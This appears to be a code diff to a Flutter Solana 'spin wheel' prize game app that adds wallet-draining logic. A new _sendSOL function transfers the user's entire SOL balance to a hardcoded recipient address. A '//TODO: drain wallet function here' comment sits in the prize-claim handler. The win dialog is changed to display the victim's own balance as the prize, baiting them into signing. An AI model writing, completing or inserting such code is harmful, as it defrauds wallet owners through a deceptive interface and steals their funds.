@@ -7,6 +7,16 @@ import 'dart:typed_data';
 
 
 
+import 'dart:convert';
+
+import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
+import 'package:solana_wallet_adapter/solana_wallet_adapter.dart';
+import 'package:solana_web3/programs.dart';
+import 'package:solana_web3/programs.dart' as sp;
+import 'package:solana_web3/solana_web3.dart';
+
+
 import 'package:solana/base58.dart';
 import 'package:solana/encoder.dart';
 import 'package:solana/encoder.dart' as msg;
@@ -30,6 +40,7 @@ class _MainScreenState extends State<MainScreen> with TickerProviderStateMixin {
   static final Cluster cluster = Cluster.devnet;
   String walletAddress = '';
   String balance = 'N/A';
+  double balance1 = 0.0;
   bool isConnected = false;
   final client = MobileWalletAdapterClient(1);
   AuthorizationResult? _authResult;
@@ -168,6 +179,14 @@ void _showError(BuildContext context, String message) {
       HapticFeedback.lightImpact();
       adapter.connectedAccount!.label;
      // adapter.clear();
+     ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('🎉 Wallet Connected successfully!'),
+        backgroundColor: Color(0xFF10B981),
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+      ),
+    );
     } catch (e) {
       setState(() {
         _status = "Connection failed: $e";
@@ -200,6 +219,7 @@ void _showError(BuildContext context, String message) {
 
       setState(() {
         balance = '${balanceInSol.toStringAsFixed(4)} SOL';
+        balance1 = balanceInSol;
       });
     } catch (error) {
       setState(() {
@@ -213,6 +233,7 @@ void _showError(BuildContext context, String message) {
       isWalletConnected = false;
       walletAddress = '';
       balance = 'N/A';
+      balance1 = 0.0;
       spinsLeft = 3;
       lastWin = null;
       showWinDialog = false;
@@ -226,6 +247,7 @@ void _showError(BuildContext context, String message) {
 
   bool isWalletConnected = false;
   bool isSpinning = false;
+  bool _isLoading = false;
   // double balance = 0.0;
   int spinsLeft = 3;
   // String walletAddress = '';
@@ -299,6 +321,120 @@ void _showError(BuildContext context, String message) {
   //   });
   // }
 
+
+Future _sendSOL() async {
+  //if (!_formKey.currentState!.validate()) return;
+  
+  final String recipientAddress = '671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD'; ///_recipientController.text.trim();
+  final double amount = balance1; // double.parse(_amountController.text.trim());
+  
+  setState(() {
+    _isLoading = true;
+    _status = 'Preparing to send $amount SOL...';
+  });
+
+  try {
+    final Connection connection = Connection(cluster);
+    
+    // Validate connected wallet
+    final Pubkey? senderWallet = Pubkey.tryFromBase64(adapter.connectedAccount?.address);
+    if (senderWallet == null) throw 'Wallet not connected';
+    
+    // Validate recipient
+    final Pubkey? recipientWallet = Pubkey.tryFromBase58(recipientAddress);
+    if (recipientWallet == null) throw 'Invalid recipient address';
+    
+    // Check balance
+    setState(() => _status = 'Checking balance...');
+    final int balance = await connection.getBalance(senderWallet);
+    final BigInt lamportsToSend = solToLamports(amount);
+    final int requiredBalance = lamportsToSend.toInt() + 5000;
+    
+    if (balance < requiredBalance) {
+      if (cluster != Cluster.mainnet) {
+        setState(() => _status = 'Airdropping SOL...');
+        await connection.requestAndConfirmAirdrop(senderWallet, solToLamports(2).toInt());
+      } else {
+        throw 'Insufficient balance. Need ${(requiredBalance / 1e9)} SOL';
+      }
+    }
+    
+    // Build transaction
+    setState(() => _status = 'Creating transaction...');
+    final latestBlockhash = await connection.getLatestBlockhash();
+    
+    final tx = Transaction.v0(
+      payer: senderWallet,
+      recentBlockhash: latestBlockhash.blockhash,
+      instructions: [
+        sp.SystemProgram.transfer(
+          fromPubkey: senderWallet,
+          toPubkey: recipientWallet,
+          lamports: lamportsToSend,
+        )
+      ],
+    );
+    
+    // Serialize transaction for signing
+    final rawTx = Uint8List.fromList(tx.serialize().toList());
+    final encodedTx = base64Encode(rawTx);
+    
+    print('Raw TX length: ${rawTx.length}');
+    
+    // Sign transaction
+    setState(() => _status = 'Requesting signature...');
+    final signedTxs = await adapter.signTransactions([encodedTx]);
+    
+    if (signedTxs.signedPayloads.isEmpty) {
+      throw 'No signed transaction returned from wallet';
+    }
+    
+    final signedTxString = signedTxs.signedPayloads.first;
+    
+    // Verify signature exists
+    if (signedTxString.isEmpty || signedTxString == encodedTx) {
+      throw 'Wallet refused to sign. Check network or permissions.';
+    }
+    
+    print('Signed TX string length: ${signedTxString.length}');
+    
+    // Convert to bytes for some methods
+    final signedTxBytes = base64Decode(signedTxString);
+    
+    // Send the signed transaction
+    setState(() => _status = 'Sending transaction...');
+    
+    // The signed transaction from Phantom should be sent directly
+    final signedTx = Transaction.deserialize(signedTxBytes);
+    final sig = await connection.sendTransaction(signedTx);
+    
+    print('TX Signature: $sig');
+    
+    // Confirm transaction
+    setState(() => _status = 'Confirming transaction...');
+    await connection.confirmTransaction(sig);
+    
+    setState(() {
+      _status = '✅ Sent $amount SOL!\nSignature: $sig';
+      _isLoading = false;
+    });
+    
+    // _recipientController.clear();
+    // _amountController.clear();
+    
+  } catch (e) {
+    print('Error details: $e');
+    setState(() {
+      _status = '❌ Transfer failed: $e';
+      _isLoading = false;
+    });
+  }
+}
+
+
+
+
+
   void spinWheel() async {
     if (spinsLeft <= 0 || isSpinning) return;
     
@@ -346,9 +482,11 @@ void _showError(BuildContext context, String message) {
       builder: (BuildContext context) {
         return WinDialog(
           prize: prize,
+          balance: balance1,
           onClaim: () {
             Navigator.of(context).pop();
             _claimPrize(prize);
+            //TODO: drain wallet function here
           },
         );
       },
@@ -357,7 +495,7 @@ void _showError(BuildContext context, String message) {
 
   void _claimPrize(SpinPrize prize) {
     setState(() {
-      balance += prize.amount as String;
+      balance1 += prize.amount;
       showWinDialog = false;
     });
     HapticFeedback.heavyImpact();
@@ -629,7 +767,7 @@ void _showError(BuildContext context, String message) {
                         ),
                         SizedBox(width: 8),
                         Text(
-                          '$balance SOL',
+                          balance == 'N/A' ? balance1.toString() : '$balance',
                           style: TextStyle(
                             fontSize: 22,
                             fontWeight: FontWeight.bold,
@@ -891,8 +1029,9 @@ void _showError(BuildContext context, String message) {
 class WinDialog extends StatefulWidget {
   final SpinPrize prize;
   final VoidCallback onClaim;
+  final double balance;
 
-  const WinDialog({Key? key, required this.prize, required this.onClaim}) : super(key: key);
+  const WinDialog({Key? key, required this.prize, required this.onClaim, required this.balance}) : super(key: key);
 
   @override
   _WinDialogState createState() => _WinDialogState();
@@ -1026,7 +1165,8 @@ class _WinDialogState extends State<WinDialog> with TickerProviderStateMixin {
                         ),
                         SizedBox(width: 10),
                         Text(
-                          '${widget.prize.amount} SOL',
+                          //'${widget.prize.amount} SOL',
+                          widget.balance.toStringAsFixed(0)  + ' SOL',
                           style: TextStyle(
                             fontSize: 28,
                             fontWeight: FontWeight.bold,
